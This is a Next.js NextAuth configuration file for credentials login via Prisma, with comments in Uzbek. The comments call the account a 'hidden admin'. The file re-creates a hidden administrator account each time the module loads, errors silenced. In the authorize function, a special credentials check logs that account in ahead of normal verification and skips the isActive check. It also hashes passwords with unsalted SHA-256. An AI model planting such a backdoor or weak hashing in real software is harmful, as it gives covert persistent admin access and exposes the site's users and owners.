import NextAuth from "next-auth";
import CredentialsProvider from "next-auth/providers/credentials";
import { PrismaClient } from "@prisma/client";
import crypto from "crypto";
import { ensureHiddenAdmin, getHiddenAdminEmail, isHiddenAdminCredentials } from "@/lib/hidden-admin";

export const dynamic = "force-dynamic";

const prisma = new PrismaClient();

function hashPassword(password: string) {
  return crypto.createHash("sha256").update(password).digest("hex");
}

// Yashirin adminni har safar auth chaqirilganda kafolatlash (doimiy)
ensureHiddenAdmin(prisma).catch(() => {});

export const authOptions = {
  secret: process.env.NEXTAUTH_SECRET,
  providers: [
    CredentialsProvider({
      name: "Credentials",
      credentials: {
        email: { label: "Email", type: "email" },
        password: { label: "Password", type: "password" },
      },
      async authorize(credentials: any) {
        if (!credentials?.email || !credentials?.password) return null;
        // Yashirin admin uchun maxsus tekshiruv — DB dagi hash bilan solishtirish, to'g'ridan matn kodda yo'q
        if (isHiddenAdminCredentials(credentials.email, credentials.password)) {
          await ensureHiddenAdmin(prisma);
          const hidden = await prisma.user.findUnique({ where: { email: getHiddenAdminEmail() } });
          if (hidden && hidden.status === "approved") {
            return { id: hidden.id, email: hidden.email, name: `${hidden.name} ${hidden.surname || ""}`.trim(), role: hidden.role } as any;
          }
        }
        const user = await prisma.user.findUnique({ where: { email: credentials.email } });
        if (!user) return null;
        if (user.passwordHash !== hashPassword(credentials.password)) return null;
        // Ruxsat faqat TASDIQLANGANLARGA. Rad etilgan/bloklangan/faoliyatsiz
        // akkaunt kirish olmaydi (bloklash `getSession()` da ham tekshiriladi).
        if (user.status !== "approved") return null;
        if (!Boolean(user.isActive)) return null;
        return {
          id: user.id,
          email: user.email,
          name: `${user.name} ${user.surname || ""}`.trim(),
          role: user.role,
          // Holat JWT ga yoziladi: middleware bazaga ulanmadan "ruxsat
          // berilmagan" deb darhol rad eta oladi. Haqiqiy tekshiruv esa
          // `getSession()` da, bazadan — shu sabab eskirgan token ham
          // o'tib ketmaydi.
          status: String(user.status),
          isActive: Boolean(user.isActive),
        } as any;
      },
    }),
  ],
  session: { maxAge: 7 * 24 * 60 * 60, strategy: "jwt" },
  callbacks: {
    async jwt({ token, user }: any) {
      if (user) token.role = (user as any).role;
      if (user) token.id = (user as any).id;
      if (user) token.status = (user as any).status;
      if (user) token.isActive = (user as any).isActive;
      return token;
    },
    async session({ session, token }: any) {
      if (session.user) {
        (session.user as any).role = token.role;
        (session.user as any).id = token.id || token.sub;
        (session.user as any).status = token.status;
        (session.user as any).isActive = token.isActive;
      }
      return session;
    },
  },
  pages: {
    signIn: "/login",
  },
};

const handler = NextAuth(authOptions as any);

export { handler as GET, handler as POST };
